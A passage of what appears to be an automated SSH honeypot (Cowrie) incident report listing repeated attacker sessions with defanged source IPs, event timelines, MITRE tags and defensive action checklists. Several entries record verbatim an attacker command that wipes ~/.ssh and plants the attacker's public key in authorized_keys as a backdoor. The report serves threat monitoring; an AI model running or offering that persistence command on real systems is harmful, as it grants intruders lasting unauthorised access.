| `2026-06-08 13:25:48` | `cowrie.command.failed` |
| `2026-06-08 13:25:48` | `cowrie.log.closed` |
| `2026-06-08 13:25:48` | `cowrie.session.params` |
| `2026-06-08 13:25:48` | `cowrie.command.input` |
| `2026-06-08 13:25:48` | `cowrie.session.file_download` |
| `2026-06-08 13:25:48` | `cowrie.log.closed` |
| `2026-06-08 13:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-415ae0c4a6be

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:25 |
| **Last Seen** | 2026-06-08 13:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:25:49` | `cowrie.session.connect` |
| `2026-06-08 13:25:49` | `cowrie.client.version` |
| `2026-06-08 13:25:49` | `cowrie.client.kex` |
| `2026-06-08 13:25:50` | `cowrie.login.success` |
| `2026-06-08 13:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fa713029da3

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:25 |
| **Last Seen** | 2026-06-08 13:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:25:59` | `cowrie.session.connect` |
| `2026-06-08 13:25:59` | `cowrie.client.version` |
| `2026-06-08 13:25:59` | `cowrie.client.kex` |
| `2026-06-08 13:26:00` | `cowrie.login.success` |
| `2026-06-08 13:26:01` | `cowrie.session.params` |
| `2026-06-08 13:26:01` | `cowrie.command.input` |
| `2026-06-08 13:26:01` | `cowrie.command.failed` |
| `2026-06-08 13:26:01` | `cowrie.log.closed` |
| `2026-06-08 13:26:02` | `cowrie.session.params` |
| `2026-06-08 13:26:02` | `cowrie.command.input` |
| `2026-06-08 13:26:02` | `cowrie.session.file_download` |
| `2026-06-08 13:26:02` | `cowrie.log.closed` |
| `2026-06-08 13:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3071a623b3e

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:26 |
| **Last Seen** | 2026-06-08 13:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:26:05` | `cowrie.session.connect` |
| `2026-06-08 13:26:05` | `cowrie.client.version` |
| `2026-06-08 13:26:05` | `cowrie.client.kex` |
| `2026-06-08 13:26:06` | `cowrie.login.success` |
| `2026-06-08 13:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e375467bf827

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:27 |
| **Last Seen** | 2026-06-08 13:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:27:52` | `cowrie.session.connect` |
| `2026-06-08 13:27:52` | `cowrie.client.version` |
| `2026-06-08 13:27:52` | `cowrie.client.kex` |
| `2026-06-08 13:27:53` | `cowrie.login.success` |
| `2026-06-08 13:27:53` | `cowrie.session.params` |
| `2026-06-08 13:27:53` | `cowrie.command.input` |
| `2026-06-08 13:27:53` | `cowrie.command.failed` |
| `2026-06-08 13:27:53` | `cowrie.log.closed` |
| `2026-06-08 13:27:53` | `cowrie.session.params` |
| `2026-06-08 13:27:53` | `cowrie.command.input` |
| `2026-06-08 13:27:53` | `cowrie.session.file_download` |
| `2026-06-08 13:27:53` | `cowrie.log.closed` |
| `2026-06-08 13:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd8655f5d52f

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:27 |
| **Last Seen** | 2026-06-08 13:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:27:54` | `cowrie.session.connect` |
| `2026-06-08 13:27:54` | `cowrie.client.version` |
| `2026-06-08 13:27:54` | `cowrie.client.kex` |
| `2026-06-08 13:27:55` | `cowrie.login.success` |
| `2026-06-08 13:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-085dd2a4d967

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 13:29 |
| **Last Seen** | 2026-06-08 13:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:29:24` | `cowrie.session.connect` |
| `2026-06-08 13:29:24` | `cowrie.client.version` |
| `2026-06-08 13:29:24` | `cowrie.client.kex` |
| `2026-06-08 13:29:25` | `cowrie.login.success` |
| `2026-06-08 13:29:26` | `cowrie.session.params` |
| `2026-06-08 13:29:26` | `cowrie.command.input` |
| `2026-06-08 13:29:26` | `cowrie.command.failed` |
| `2026-06-08 13:29:26` | `cowrie.log.closed` |
| `2026-06-08 13:29:27` | `cowrie.session.params` |
| `2026-06-08 13:29:27` | `cowrie.command.input` |
| `2026-06-08 13:29:27` | `cowrie.session.file_download` |
| `2026-06-08 13:29:27` | `cowrie.log.closed` |
| `2026-06-08 13:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e151640be71

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 13:29 |
| **Last Seen** | 2026-06-08 13:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:29:30` | `cowrie.session.connect` |
| `2026-06-08 13:29:30` | `cowrie.client.version` |
| `2026-06-08 13:29:30` | `cowrie.client.kex` |
| `2026-06-08 13:29:31` | `cowrie.login.success` |
| `2026-06-08 13:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2bb59eded66

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:30 |
| **Last Seen** | 2026-06-08 13:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:30:02` | `cowrie.session.connect` |
| `2026-06-08 13:30:02` | `cowrie.client.version` |
| `2026-06-08 13:30:02` | `cowrie.client.kex` |
| `2026-06-08 13:30:02` | `cowrie.login.success` |
| `2026-06-08 13:30:02` | `cowrie.session.params` |
| `2026-06-08 13:30:02` | `cowrie.command.input` |
| `2026-06-08 13:30:02` | `cowrie.command.failed` |
| `2026-06-08 13:30:02` | `cowrie.log.closed` |
| `2026-06-08 13:30:02` | `cowrie.session.params` |
| `2026-06-08 13:30:02` | `cowrie.command.input` |
| `2026-06-08 13:30:02` | `cowrie.session.file_download` |
| `2026-06-08 13:30:02` | `cowrie.log.closed` |
| `2026-06-08 13:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-145c08d5bf37

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:30 |
| **Last Seen** | 2026-06-08 13:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:30:04` | `cowrie.session.connect` |
| `2026-06-08 13:30:04` | `cowrie.client.version` |
| `2026-06-08 13:30:04` | `cowrie.client.kex` |
| `2026-06-08 13:30:04` | `cowrie.login.success` |
| `2026-06-08 13:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84e1382a4150

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:30 |
| **Last Seen** | 2026-06-08 13:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:30:10` | `cowrie.session.connect` |
| `2026-06-08 13:30:10` | `cowrie.client.version` |
| `2026-06-08 13:30:10` | `cowrie.client.kex` |
| `2026-06-08 13:30:11` | `cowrie.login.success` |
| `2026-06-08 13:30:11` | `cowrie.session.params` |
| `2026-06-08 13:30:11` | `cowrie.command.input` |
| `2026-06-08 13:30:11` | `cowrie.command.failed` |
| `2026-06-08 13:30:12` | `cowrie.log.closed` |
| `2026-06-08 13:30:12` | `cowrie.session.params` |
| `2026-06-08 13:30:12` | `cowrie.command.input` |
| `2026-06-08 13:30:12` | `cowrie.session.file_download` |
| `2026-06-08 13:30:12` | `cowrie.log.closed` |
| `2026-06-08 13:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c72de9e6d62e

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:30 |
| **Last Seen** | 2026-06-08 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:30:15` | `cowrie.session.connect` |
| `2026-06-08 13:30:15` | `cowrie.client.version` |
| `2026-06-08 13:30:16` | `cowrie.client.kex` |
| `2026-06-08 13:30:17` | `cowrie.login.success` |
| `2026-06-08 13:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2736782097bf

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:32 |
| **Last Seen** | 2026-06-08 13:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:32:06` | `cowrie.session.connect` |
| `2026-06-08 13:32:06` | `cowrie.client.version` |
| `2026-06-08 13:32:06` | `cowrie.client.kex` |
| `2026-06-08 13:32:06` | `cowrie.login.success` |
| `2026-06-08 13:32:07` | `cowrie.session.params` |
| `2026-06-08 13:32:07` | `cowrie.command.input` |
| `2026-06-08 13:32:07` | `cowrie.command.failed` |
| `2026-06-08 13:32:07` | `cowrie.log.closed` |
| `2026-06-08 13:32:07` | `cowrie.session.params` |
| `2026-06-08 13:32:07` | `cowrie.command.input` |
| `2026-06-08 13:32:07` | `cowrie.session.file_download` |
| `2026-06-08 13:32:07` | `cowrie.log.closed` |
| `2026-06-08 13:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c361ef115e44

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:32 |
| **Last Seen** | 2026-06-08 13:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:32:08` | `cowrie.session.connect` |
| `2026-06-08 13:32:08` | `cowrie.client.version` |
| `2026-06-08 13:32:08` | `cowrie.client.kex` |
| `2026-06-08 13:32:10` | `cowrie.login.success` |
| `2026-06-08 13:32:10` | `cowrie.session.params` |
| `2026-06-08 13:32:10` | `cowrie.command.input` |
| `2026-06-08 13:32:10` | `cowrie.command.failed` |
| `2026-06-08 13:32:11` | `cowrie.log.closed` |
| `2026-06-08 13:32:11` | `cowrie.session.params` |
| `2026-06-08 13:32:11` | `cowrie.command.input` |
| `2026-06-08 13:32:12` | `cowrie.session.file_download` |
| `2026-06-08 13:32:12` | `cowrie.log.closed` |
| `2026-06-08 13:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6058d0966a3d

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:32 |
| **Last Seen** | 2026-06-08 13:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:32:08` | `cowrie.session.connect` |
| `2026-06-08 13:32:08` | `cowrie.client.version` |
| `2026-06-08 13:32:08` | `cowrie.client.kex` |
| `2026-06-08 13:32:08` | `cowrie.login.success` |
| `2026-06-08 13:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0247ef1bf5b1

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:32 |
| **Last Seen** | 2026-06-08 13:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:32:15` | `cowrie.session.connect` |
| `2026-06-08 13:32:15` | `cowrie.client.version` |
| `2026-06-08 13:32:16` | `cowrie.client.kex` |
| `2026-06-08 13:32:17` | `cowrie.login.success` |
| `2026-06-08 13:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbd85967d394

| Field | Detail |
|---|---|
| **Source IP** | `190.119.63[.]81` |
| **First Seen** | 2026-06-08 13:32 |
| **Last Seen** | 2026-06-08 13:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:32:19` | `cowrie.session.connect` |
| `2026-06-08 13:32:19` | `cowrie.client.version` |
| `2026-06-08 13:32:19` | `cowrie.client.kex` |
| `2026-06-08 13:32:22` | `cowrie.login.success` |
| `2026-06-08 13:32:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.119.63[.]81` to AbuseIPDB if not already reported
- [ ] Block `190.119.63[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-900765599ce5

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:34 |
| **Last Seen** | 2026-06-08 13:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:34:11` | `cowrie.session.connect` |
| `2026-06-08 13:34:11` | `cowrie.client.version` |
| `2026-06-08 13:34:11` | `cowrie.client.kex` |
| `2026-06-08 13:34:12` | `cowrie.login.success` |
| `2026-06-08 13:34:12` | `cowrie.session.params` |
| `2026-06-08 13:34:12` | `cowrie.command.input` |
| `2026-06-08 13:34:12` | `cowrie.command.failed` |
| `2026-06-08 13:34:12` | `cowrie.log.closed` |
| `2026-06-08 13:34:12` | `cowrie.session.params` |
| `2026-06-08 13:34:12` | `cowrie.command.input` |
| `2026-06-08 13:34:12` | `cowrie.session.file_download` |
| `2026-06-08 13:34:12` | `cowrie.log.closed` |
| `2026-06-08 13:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf0c36d608b2

| Field | Detail |
|---|---|
